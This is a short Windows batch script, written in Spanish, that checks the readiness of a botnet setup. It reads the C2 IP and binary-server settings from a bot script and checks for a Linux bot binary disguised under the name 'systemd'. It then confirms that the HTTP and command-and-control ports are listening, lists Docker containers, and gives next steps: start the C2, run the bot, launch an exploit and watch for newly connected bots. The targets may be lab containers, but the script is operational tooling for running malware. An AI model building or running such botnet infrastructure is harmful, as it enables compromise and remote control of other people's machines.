@echo off
cls
echo ========================================
echo   VERIFICACION COMPLETA - POST ARREGLO
echo ========================================
echo.

echo [1] Configuracion en bot_soldier.py:
echo.
findstr /C:"C2_IP =" bot_soldier.py
findstr /C:"BINARY_SERVER =" bot_soldier.py
echo.

echo [2] Verificando binarios:
echo.
if exist "bots\linux\x86_64\systemd" (
    echo [OK] Binario Linux: bots\linux\x86_64\systemd
    dir "bots\linux\x86_64\systemd" | findstr /C:"systemd"
) else (
    echo [FALTA] Binario Linux no encontrado
)
echo.

echo [3] Servidor HTTP activo:
echo.
netstat -ano | findstr ":8000.*LISTENING" >nul
if %errorlevel% equ 0 (
    echo [OK] Puerto 8000 activo
) else (
    echo [ERROR] Puerto 8000 NO activo
)
echo.

echo [4] C2 Server activo:
echo.
netstat -ano | findstr ":8443.*LISTENING" >nul
if %errorlevel% equ 0 (
    echo [OK] Puerto 8443 activo
) else (
    echo [ERROR] Puerto 8443 NO activo - Ejecuta: python c2_commander.py
)
echo.

echo [5] Contenedores Docker:
echo.
docker ps --format "{{.Names}} - {{.Ports}}"
echo.

echo ========================================
echo   ESTADO: LISTO PARA PROBAR
echo ========================================
echo.
echo Pasos siguientes:
echo   1. Espera que termine compilacion Docker
echo   2. Reinicia C2: python c2_commander.py
echo   3. Ejecuta bot: python bot_soldier.py
echo   4. Explota: exploit 1 1
echo   5. Verifica nuevos bots conectados
echo.
pause
